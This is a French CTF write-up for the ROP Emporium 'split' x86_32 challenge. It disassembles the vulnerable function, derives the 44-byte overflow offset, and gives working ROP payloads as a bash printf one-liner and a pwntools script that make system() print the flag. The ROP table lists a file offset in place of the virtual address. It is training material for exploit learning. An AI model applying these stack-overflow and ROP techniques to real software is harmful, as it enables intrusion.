---
Title: Ropemporium x86_32 split
Date: 2023-06-12
Tags: [linux, python, ROP, x86_32, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
---


# split x86_32

## Introduction.

Dans ce second exercice on doit passer une argument à la fonction appelée.
L'argument est présent dans le programme.

La démarche est la même qu'en x86 64 avec deux différences.
- la taille des registres est de 32 bits donc la sauvegarde de ebp occupe 4 bytes au lieu de 8 en 64 bits.
- Le passage des paramètre s'effectue exclusivement sur la pile.


## Analyse

On regarde le code de la fonction pwnme :

```
gef➤  disas pwnme
Dump of assembler code for function pwnme:
   0x080485ad <+0>:	push   ebp
   0x080485ae <+1>:	mov    ebp,esp
   0x080485b0 <+3>:	sub    esp,0x28
   0x080485b3 <+6>:	sub    esp,0x4
   0x080485b6 <+9>:	push   0x20
   0x080485b8 <+11>:	push   0x0
   0x080485ba <+13>:	lea    eax,[ebp-0x28]
   0x080485bd <+16>:	push   eax
   0x080485be <+17>:	call   0x8048410 <memset@plt>
   0x080485c3 <+22>:	add    esp,0x10
   0x080485c6 <+25>:	sub    esp,0xc
   0x080485c9 <+28>:	push   0x80486d4
   0x080485ce <+33>:	call   0x80483d0 <puts@plt>
   0x080485d3 <+38>:	add    esp,0x10
   0x080485d6 <+41>:	sub    esp,0xc
   0x080485d9 <+44>:	push   0x8048700
   0x080485de <+49>:	call   0x80483c0 <printf@plt>
   0x080485e3 <+54>:	add    esp,0x10
   0x080485e6 <+57>:	sub    esp,0x4
   0x080485e9 <+60>:	push   0x60
   0x080485eb <+62>:	lea    eax,[ebp-0x28]
   0x080485ee <+65>:	push   eax
   0x080485ef <+66>:	push   0x0
   0x080485f1 <+68>:	call   0x80483b0 <read@plt>
   0x080485f6 <+73>:	add    esp,0x10
   0x080485f9 <+76>:	sub    esp,0xc
   0x080485fc <+79>:	push   0x8048703
   0x08048601 <+84>:	call   0x80483d0 <puts@plt>
   0x08048606 <+89>:	add    esp,0x10
   0x08048609 <+92>:	nop
   0x0804860a <+93>:	leave
   0x0804860b <+94>:	ret
End of assembler dump.
```
On voit que la lecture se fait 40 octets avant l'adresse contenue dans ebp.

   0x080485eb <+62>:	lea    eax,[ebp-0x28]

L'offset de débordement est donc de 44 (0x2c) octets.

La fonction utile présente dans le code est  :

      gef➤  disas usefulFunction
      Dump of assembler code for function usefulFunction:
         0x0804860c <+0>:	push   ebp
         0x0804860d <+1>:	mov    ebp,esp
         0x0804860f <+3>:	sub    esp,0x8
         0x08048612 <+6>:	sub    esp,0xc
         0x08048615 <+9>:	push   0x804870e               ; "/bin/sl"
      => 0x0804861a <+14>:	call   0x80483e0 <system@plt>
         0x0804861f <+19>:	add    esp,0x10
         0x08048622 <+22>:	nop
         0x08048623 <+23>:	leave
         0x08048624 <+24>:	ret
      End of assembler dump.

Elle appelle la fonction system avec la chaine de caratère "/bin ls".
On pourra donc viser un retour en usefulFunction+14 pour executer un commande.

PAr ailleurs, chaine de caractère utile pour afficher el flag est disponible dans le code.

      /w/ropemporium/x32/split# rabin2 -z split32
      [Strings]
      nth paddr      vaddr      len size section type  string
      ―――――――――――――――――――――――――――――――――――――――――――――――――――――――
      0   0x000006b0 0x080486b0 21  22   .rodata ascii split by ROP Emporium
      1   0x000006c6 0x080486c6 4   5    .rodata ascii x86\n
      2   0x000006cb 0x080486cb 8   9    .rodata ascii \nExiting
      3   0x000006d4 0x080486d4 43  44   .rodata ascii Contriving a reason to ask user for data...
      4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!
      5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls
      0   0x00001030 0x0804a030 17  18   .data   ascii /bin/cat flag.txt

A l'adresse 0x0804a030 on trouve la chaine "/bin/cat flag.txt".

## Construction de l'attaque.

Notre objectif va être d'appeller la fonction system en appellant l'adresse 0x0804861a avec en paramètre l'adresse la la chaine "/bin/cat flag.txt" : 0x0804a030.

Pour passer le paramêtre il nous faut simplement placer sur la pile l'adresse de la chaine de caractère avec l'adresse de l'appel system.


### La ropchaine

La chaine de rop est simplement :

| ROP entry | comment |
| ----------- | ------- |
| 0x00001030 | @ /bin/cat flag.txt |
| 0x0804861a | appel system |


## Exploitation

### En bash

```sh
   w/ropemporium/x32/split# printf "%44s\x1a\x86\x04\x08\x30\xa0\x04\x08" A |./split32
   split by ROP Emporium
   x86

   Contriving a reason to ask user for data...
   > Thank you!
   ROPE{a_placeholder_32byte_flag!}
```

### En python

``` python

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

gs='''
b *pwnme+89
c
'''

#context(terminal=['tmux', 'split-window', '-h'])
# Set up pwntools for the correct architecture
elf =  ELF('split32')
context.binary=elf
# context(terminal=['tmux'])

useful_str=elf.symbols["usefulString"]
useful_fun=elf.symbols["usefulFunction"]

offset=0x2c

io = process([elf.path])
#io = gdb.debug([elf.path],gdbscript=gs)
# gdb.attach(io,gs)
time.sleep(.5)

print(f"{useful_str=:x}")
print(f"{useful_fun=:x}")

io.recvuntil(b"> ")

# On retourn en useful_fun pour sauter l'affectation de edi dans la fonction
PL=offset*b"A"+p32(useful_fun+14)+p32(useful_str)
io.sendline(PL)
io.interactive()

```







